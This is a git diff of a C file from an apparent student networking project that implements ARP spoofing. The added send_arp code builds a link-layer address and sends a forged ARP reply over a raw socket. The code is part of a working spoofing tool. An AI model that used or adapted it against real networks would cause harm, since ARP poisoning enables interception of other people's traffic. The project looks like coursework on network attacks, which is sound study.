@@ -6,7 +6,7 @@
 /*   By: nponchon <nponchon@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/04 18:38:53 by nponchon          #+#    #+#             */
-/*   Updated: 2025/11/14 16:59:47 by nponchon         ###   ########.fr       */
+/*   Updated: 2025/11/18 11:27:06 by nponchon         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -51,7 +51,11 @@ struct ether_arp	forge_arp(struct ether_arp *original_arp, t_malcolm *m)
 
 void	send_arp(t_malcolm *m, unsigned char *buf)
 {
-	(void)m;
+	struct sockaddr_ll dest_addr = {0};
+	dest_addr.sll_ifindex = if_nametoindex("eth0"); // Replace "eth0" with your interface name
+	printf("Interface index: %d\n", dest_addr.sll_ifindex);
+	dest_addr.sll_halen = ETH_ALEN; // Ethernet address length
+	ft_memcpy(dest_addr.sll_addr, target_mac, ETH_ALEN); // Set target MAC address
 
 	struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ether_header));
 	char sender_ip[INET_ADDRSTRLEN];
@@ -62,9 +66,9 @@ void	send_arp(t_malcolm *m, unsigned char *buf)
 	printf("Sending forged ARP reply to %s\n", target_ip);
 
 	struct ether_arp forged_arp = forge_arp(arp, m);
-	ssize_t bytes_sent = send(m->socket, &forged_arp, sizeof(forged_arp), 0);
+	ssize_t bytes_sent = sendto(m->socket, &forged_arp, sizeof(forged_arp), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
 	if (bytes_sent < 0) {
-		fprintf(stderr, "Error: unable to send forged ARP reply\n");
+		perror("sendto failed");
 	} else {
 		printf("Successfully sent forged ARP reply (%zd bytes)\n", bytes_sent);
 	}
